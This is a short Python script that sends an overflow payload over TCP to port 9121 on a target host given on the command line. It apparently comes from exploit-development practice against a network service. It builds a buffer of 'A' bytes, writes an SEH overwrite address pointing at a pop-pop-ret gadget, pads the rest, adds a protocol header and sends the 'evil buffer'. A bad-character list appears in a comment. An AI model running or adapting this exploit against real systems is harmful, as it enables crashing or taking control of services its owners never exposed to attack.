#!/usr/bin/python
import socket
import sys
from struct import pack
try:
    server = sys.argv[1]
    port = 9121
    size= 1000
	# 0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD
    inputBuffer = b"\x41"*128
    inputBuffer += pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
    inputBuffer += b"\x43" * (size - len(inputBuffer))
    
    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])
    
    buf = header + inputBuffer
    
    print("Sending evil buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")
